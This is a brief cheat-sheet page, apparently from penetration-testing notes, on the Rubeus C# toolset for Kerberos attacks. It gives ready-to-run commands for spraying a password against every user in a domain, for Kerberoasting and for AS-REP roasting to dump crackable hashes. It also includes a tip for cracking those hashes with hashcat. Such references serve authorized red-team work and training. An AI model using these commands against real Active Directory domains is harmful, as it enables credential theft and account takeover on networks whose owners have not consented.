---
title: RUBEUS
summary: "A C# toolset for raw Kerberos interaction and abuses."
description: "A C# toolset for raw Kerberos interaction and abuses."
---

**[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)**

## Password Spraying


 > 
 > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**</br>
 > Spray a password against all users in current domain and return the `.kirbi` TGT of users that use this password.

## Kerberoasting


 > 
 > **<font color=red>Rubeus.exe kerberoast</font>**</br>
 > Dump Kerberos hashes of kerberoastable users (same as GetUserSPNs.py but on the target machine).

## AS_REProasting


 > 
 > **<font color=red>Rubeus.exe asreproast</font>**</br>
  
 > Dump Kerberos hashes of AS_REProastable users. (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
